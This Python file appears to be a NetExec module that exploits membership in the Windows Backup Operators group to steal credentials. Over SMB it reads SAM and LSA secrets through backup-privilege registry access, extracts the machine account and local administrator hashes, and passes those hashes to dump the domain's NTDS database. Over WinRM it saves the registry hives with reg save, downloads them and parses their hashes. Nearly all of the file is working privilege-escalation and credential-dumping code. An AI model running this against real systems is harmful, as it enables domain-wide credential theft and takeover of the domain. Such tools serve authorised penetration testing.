import contextlib
import re
from binascii import unhexlify

from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import SAMHashes, LSASecrets, LocalOperations
from impacket.examples.regsecrets import (
    RemoteOperations as RegSecretsRemoteOperations,
    SAMHashes as RegSecretsSAMHashes,
    LSASecrets as RegSecretsLSASecrets,
)
from nxc.helpers.misc import CATEGORY, gen_random_string

TEMP_DIR = "C:\\Windows\\Temp"


class BackupOperatorRemoteOperations(RegSecretsRemoteOperations):
    """regsecrets RemoteOperations without the SCMR service handling: its
    status check opens the service manager and the RemoteRegistry service
    with rights a backup operator does not have. Opening the winreg pipe
    trigger-starts the service instead, so only the bind is needed.
    """

    def enableRegistry(self):
        self._RemoteOperations__connectWinReg()

    def getBootKey(self):
        # regsecrets opens the Lsa class keys without backup intent, which
        # is denied to a backup operator: SeBackupPrivilege covers the
        # backup-intent open instead
        boot_key = b""
        self.openHKLMHandle()
        for key in ["JD", "Skew1", "GBG", "Data"]:
            ans = rrp.hBaseRegOpenKey(
                self._RemoteOperations__rrp,
                self._RemoteOperations__regHandle,
                f"SYSTEM\\CurrentControlSet\\Control\\Lsa\\{key}",
                dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK,
                samDesired=rrp.KEY_READ,
            )
            key_handle = ans["phkResult"]
            info = rrp.hBaseRegQueryInfoKey(self._RemoteOperations__rrp, key_handle)
            boot_key += info["lpClassOut"][:-1].encode("utf-8")
            rrp.hBaseRegCloseKey(self._RemoteOperations__rrp, key_handle)

        boot_key = unhexlify(boot_key)
        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
        return bytes(boot_key[transforms[i]] for i in range(len(boot_key)))


class NXCModule:
    name = "backup_operator"
    description = "Exploit user in backup operator group to dump NTDS @mpgn_x64"
    supported_protocols = ["smb", "winrm"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options

    def options(self, context, module_options):
        """NO OPTIONS"""

    def on_login(self, context, connection):
        if connection.protocol == "winrm":
            BackupOperator_WinRM(context, connection).run()
        else:
            BackupOperator_Smb(context, connection).run()


class BackupOperator:
    """Common state and helpers shared by the protocol classes below."""

    HIVES = ["SAM", "SECURITY", "SYSTEM"]

    def __init__(self, context, connection):
        self.context = context
        self.connection = connection
        self.local_admin = None
        self.local_admin_hash = None
        self.machine_account = None
        self.machine_account_hash = None

    def _parse_sam_secret(self, secret):
        self.context.log.highlight(secret)
        if not self.local_admin:
            first_line = secret.strip().splitlines()[0]
            fields = first_line.split(":")
            if len(fields) >= 4:
                self.local_admin = fields[0]
                self.local_admin_hash = fields[3]

    def _parse_lsa_secret(self, secret_type, secret):
        self.context.log.highlight(secret)
        if self.machine_account:
            return
        for line in secret.splitlines():
            match = re.search(r"aad3b435b51404eeaad3b435b51404ee:([0-9a-f]{32})", line, re.IGNORECASE)
            if match:
                self.machine_account_hash = match.group(1)
                account_name = line.split(":", 1)[0].strip().split("\\")[-1]
                # "$MACHINE.ACC" has no real name -> derive it from the connection.
                self.machine_account = account_name if account_name.endswith("$") else f"{self.connection.hostname}$"
                return

    def _parse_local_hives(self, log_path, skip_lsa=False):
        try:
            local_operations = LocalOperations(log_path + "SYSTEM")
            boot_key = local_operations.getBootKey()
            sam_hashes = SAMHashes(log_path + "SAM", boot_key, isRemote=False, perSecretCallback=self._parse_sam_secret)
            sam_hashes.dump()
            sam_hashes.finish()

            if not skip_lsa:
                lsa_secrets = LSASecrets(log_path + "SECURITY", boot_key, None, isRemote=False, perSecretCallback=self._parse_lsa_secret)
                lsa_secrets.dumpCachedHashes()
                lsa_secrets.dumpSecrets()
        except Exception as e:
            self.context.log.fail(f"Fail to dump the sam and lsa: {e!s}")


class BackupOperator_Smb(BackupOperator):
    def run(self):
        # The regsecrets extraction walks the hives with backup-intent opens
        # and registry queries: no RegSaveKey, no hive file dropped on the
        # target, the backup operator SeBackupPrivilege covers it all.
        # Local backup operators only work with LocalAccountTokenFilterPolicy
        # set on the target: the UAC-filtered network token of a local
        # account drops SeBackupPrivilege, domain accounts are not filtered.
        context = self.context
        context.log.display("Dumping SAM and LSA secrets through the registry...")
        # open the winreg pipe so the trigger-started RemoteRegistry spins
        # up without any service rights: enableRegistry would otherwise try
        # to start it through SCMR, which a backup operator cannot
        self.connection.trigger_winreg()
        remote_ops = None
        try:
            remote_ops = BackupOperatorRemoteOperations(self.connection.conn, self.connection.kerberos, self.connection.kdcHost)
            remote_ops.enableRegistry()
            bootkey = remote_ops.getBootKey()

            sam = RegSecretsSAMHashes(bootkey, remoteOps=remote_ops, perSecretCallback=self._parse_sam_secret)
            sam.dump()
            lsa = RegSecretsLSASecrets(bootkey, remoteOps=remote_ops, perSecretCallback=self._parse_lsa_secret)
            lsa.dumpCachedHashes()
            lsa.dumpSecrets()
        except Exception as e:
            context.log.fail(f"Fail to dump the sam and lsa: {e!s}")
            return
        finally:
            if remote_ops is not None:
                with contextlib.suppress(Exception):
                    remote_ops.finish()

        # The machine account can DCSync, the RID 500 hash is the local
        # (domain on a DC) administrator
        for username, user_hash in [(self.machine_account, self.machine_account_hash), (self.local_admin, self.local_admin_hash)]:
            if self._try_dump_ntds(username, user_hash):
                break

    def _try_dump_ntds(self, username, user_hash):
        if not username or not user_hash:
            return False
        with contextlib.suppress(Exception):
            self.connection.conn.logoff()
        self.connection.create_conn_obj()
        if self.connection.hash_login(self.connection.domain, username, user_hash):
            try:
                self.context.log.display(f"Dumping NTDS using {username}...")
                self.connection.ntds()
                return True
            except Exception as e:
                self.context.log.fail(f"Fail to dump the NTDS with {username}: {e!s}")
        return False


class BackupOperator_WinRM(BackupOperator):
    CLEANUP_DIR = TEMP_DIR

    def run(self):
        rand_suffix = gen_random_string(8)
        log_path = f"{self.connection.output_filename}."

        # Dos attack prevent: reg save refuses to overwrite an existing file
        # with an interactive "(Yes/No)?" prompt, and the runspace hosting
        # the command is not a tty - pypsrp never gets an answer and loops
        # the command until the target runs out of memory. Random store
        # names prevent any preexisting file from matching. One reg save per hive: as a plain
        # backup operator reg save is refused on HKLM\SECURITY (SAM and
        # SYSTEM still go through), so one hive failing must not abort the
        # whole dump.
        self.context.log.display("Saving SAM, SECURITY and SYSTEM with reg save (SeBackupPrivilege)...")
        for hive in self.HIVES:
            # a backup operator with WinRM access does not necessarily have
            # a WinRS cmd shell, run the command through a runspace
            self.connection.ps_execute(f"cmd /c 'reg save HKLM\\{hive} {TEMP_DIR}\\{hive}_{rand_suffix}'", True)

        saved_hives = []
        for hive in self.HIVES:
            if self.connection.file_transfer.get_file(f"{TEMP_DIR}\\{hive}_{rand_suffix}", log_path + hive):
                saved_hives.append(hive)
            else:
                self.context.log.debug(f"Couldn't fetch the {hive} hive")
        if "SAM" not in saved_hives or "SYSTEM" not in saved_hives:
            self.context.log.fail("Couldn't fetch the SAM or SYSTEM hive")
            self._print_cleanup_warning(rand_suffix)
            return

        skip_lsa = "SECURITY" not in saved_hives
        if skip_lsa:
            self.context.log.display("SECURITY hive not saved (often refused to backup operators over reg save): skipping LSA secrets")
        self._parse_local_hives(log_path, skip_lsa=skip_lsa)

        # no NTDS dump over winrm: the smb chain escalates to the machine
        # account for a DCSync, and there is no winrm equivalent - shadow
        # copies and vssadmin need an administrator
        self.context.log.display("NTDS cannot be dumped as a backup operator over winrm")

        if self._delete_dump_files(rand_suffix):
            self.context.log.display("Successfully deleted dump files !")
        else:
            self._print_cleanup_warning(rand_suffix)

    def _delete_dump_files(self, rand_suffix):
        # clean up our own dump files in the same session: dir lists what is
        # left after the delete, no output means the files are gone
        files = " ".join(f"{TEMP_DIR}\\{hive}_{rand_suffix}" for hive in self.HIVES)
        leftover = self.connection.ps_execute(f"cmd /c 'del {files} 2>nul & dir /b {files} 2>nul'", True) or ""
        return not leftover.strip()

    def _print_cleanup_warning(self, rand_suffix):
        self.context.log.fail(f"Files were not automatically deleted. Please clean up manually: {self.CLEANUP_DIR}\\SECURITY_{rand_suffix}, SAM_{rand_suffix}, SYSTEM_{rand_suffix}")
